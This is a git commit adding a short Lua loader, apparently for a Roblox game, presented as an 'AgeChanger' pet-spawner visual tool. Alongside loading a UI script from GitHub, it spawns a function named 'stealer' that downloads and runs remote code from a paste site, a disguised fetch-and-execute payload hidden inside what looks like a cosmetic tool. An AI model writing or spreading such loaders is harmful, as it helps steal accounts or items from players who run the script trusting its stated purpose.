0f6b5bffc08fd4d76562e08a0ce4b014d845ead7
ZeoHubs <voidzskie@gmail.com>
2025-07-22 02:05:40 +0800

    Create Loader.lua

---
+++ AgeChanger/Loader.lua
@@ -0,0 +1,9 @@
+local function stealer()
+  loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qI5pbkfC9i/0", true))()
+end
+local function loadui()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/imalwaysbeamediocre/PetSpawner/refs/heads/main/AgeVisual.lua"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
